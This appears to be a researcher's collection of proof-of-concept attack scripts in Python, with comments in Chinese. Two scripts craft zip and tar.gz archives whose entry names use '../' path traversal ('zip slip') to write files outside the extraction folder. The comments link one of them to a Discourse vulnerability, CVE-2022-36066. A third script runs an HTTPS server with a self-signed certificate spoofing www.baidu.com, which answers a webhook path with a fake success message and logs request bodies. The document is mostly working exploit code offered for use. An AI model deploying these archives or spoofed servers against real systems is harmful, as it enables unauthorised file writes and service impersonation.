#### zipSlip

```python
import zipfile

if __name__ == "__main__":
    try:
        zipFile = zipfile.ZipFile("poc.zip", "a", zipfile.ZIP_DEFLATED)  ##生成的zip文件
        zipFile.write("./test", "../../../../../../../../../../tmp/zipSlip", zipfile.ZIP_DEFLATED)  ##压缩的文件和在zip中显示的文件名
        zipFile.close()
    except IOError as e:
        raise e
```

```python
import tarfile
import io


def generate_slip_tgz(output_filename, target_path_in_tar, content):
    try:
        # 创建一个 tar.gz 文件
        with tarfile.open(output_filename, "w:gz") as tar:
            # 创建文件内容流
            file_data = content.encode('utf-8')
            file_stream = io.BytesIO(file_data)

            # 核心步骤：构造 TarInfo 对象
            # name 参数就是压缩包内显示的路径，这里注入路径穿越符
            info = tarfile.TarInfo(name=target_path_in_tar)
            info.size = len(file_data)

            # 将伪造好的信息和数据写入压缩包
            tar.addfile(info, file_stream)

        print(f"[+] 成功生成: {output_filename}")
        print(f"[+] 内部路径注入为: {target_path_in_tar}")

    except Exception as e:
        print(f"[-] 生成失败: {e}")


if __name__ == "__main__":
    # 在 2018 年版的 Discourse 审计中，通常需要多跳几级目录
    # 尝试写入到容器内的 tmp 目录作为 PoC 验证
    malicious_path = "../../../../../../../../../tmp/pwned_by_discourse.txt"
    poc_content = "Vulnerability Verified: CVE-2022-36066 Path Traversal"

    generate_slip_tgz("poc.tar.gz", malicious_path, poc_content)
```

#### httpsServer

```python
import ssl
import http.server
import datetime
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

# ================= ⚙️ 配置区 =================
LISTEN_IP = "0.0.0.0"  # 监听的IP地址 (0.0.0.0 表示允许外部访问)
PORT = 4443  # 监听的 HTTPS 端口
DOMAIN = "www.baidu.com"  # 伪造的域名 (将作为证书的 CN)

# 路由与响应配置
TARGET_PATH = "/webhooks/aws"  # 触发响应的精确路径
RESPONSE_STATUS = 200  # HTTP 响应状态码
RESPONSE_BODY = '{"status": "success", "message": "Pwned!"}'  # 响应体内容
CONTENT_TYPE = "application/json"  # 响应头 Content-Type


# ==========================================

def generate_self_signed_cert(domain, cert_file="cert.pem", key_file="key.pem"):
    print(f"[*] 正在为域名 {domain} 生成自签名证书...")

    # 1. 生成私钥 (RSA 2048)
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
    )

    # 2. 构造证书主题 (Subject) 和颁发者 (Issuer) 
    # 自签名证书中，两者相同
    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COUNTRY_NAME, u"CN"),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, u"Security Research Lab"),
        x509.NameAttribute(NameOID.COMMON_NAME, domain),  # 核心：将 CN 设置为变量
    ])

    # 3. 构建证书
    cert = x509.CertificateBuilder().subject_name(
        subject
    ).issuer_name(
        issuer
    ).public_key(
        private_key.public_key()
    ).serial_number(
        x509.random_serial_number()
    ).not_valid_before(
        datetime.datetime.utcnow()
    ).not_valid_after(
        # 证书有效期 10 天
        datetime.datetime.utcnow() + datetime.timedelta(days=10)
    ).add_extension(
        x509.SubjectAlternativeName([x509.DNSName(domain)]),
        critical=False,
    ).sign(private_key, hashes.SHA256())

    # 4. 写入文件
    with open(key_file, "wb") as f:
        f.write(private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.TraditionalOpenSSL,
            encryption_algorithm=serialization.NoEncryption()
        ))

    with open(cert_file, "wb") as f:
        f.write(cert.public_bytes(serialization.Encoding.PEM))

    print("[+] 证书生成完毕: cert.pem, key.pem")


class DynamicRequestHandler(http.server.BaseHTTPRequestHandler):
    # 处理 GET 请求
    def do_GET(self):
        self.handle_custom_routing()

    # 处理 POST 请求 (Webhook 通常是 POST)
    def do_POST(self):
        # 打印接收到的请求头和数据，方便调试
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length) if content_length > 0 else b""

        print(f"\n[>>>] 收到来自 {self.client_address[0]} 的 POST 请求:")
        print(f"Path: {self.path}")
        print(f"Headers:\n{self.headers}")
        if post_data:
            print(f"Body: {post_data.decode('utf-8', errors='ignore')}")

        self.handle_custom_routing()

    def handle_custom_routing(self):
        # 匹配配置的路径
        if self.path == TARGET_PATH:
            self.send_response(RESPONSE_STATUS)
            self.send_header('Content-Type', CONTENT_TYPE)
            self.end_headers()
            self.wfile.write(RESPONSE_BODY.encode('utf-8'))
            print(f"[<<<] 已返回设定的响应 ({RESPONSE_STATUS})")
        else:
            # 路径不匹配时返回 404
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"404 Not Found")
            print(f"[<<<] 路径不匹配，返回 404")


def run_server():
    # 生成证书
    generate_self_signed_cert(DOMAIN)

    # 启动 HTTPS Server
    server_address = (LISTEN_IP, PORT)
    httpd = http.server.HTTPServer(server_address, DynamicRequestHandler)

    # 包装 SSL
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile="cert.pem", keyfile="key.pem")
    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)

    print(f"\n[*] 🚀 HTTPS Server 启动成功！")
    print(f"[*] 监听地址: https://{LISTEN_IP}:{PORT}{TARGET_PATH}")
    print(f"[*] 绑定域名 (CN): {DOMAIN}")
    print("[*] 按 Ctrl+C 停止服务...\n")

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] 服务已关闭。")
        httpd.server_close()


if __name__ == '__main__':
    run_server()
```

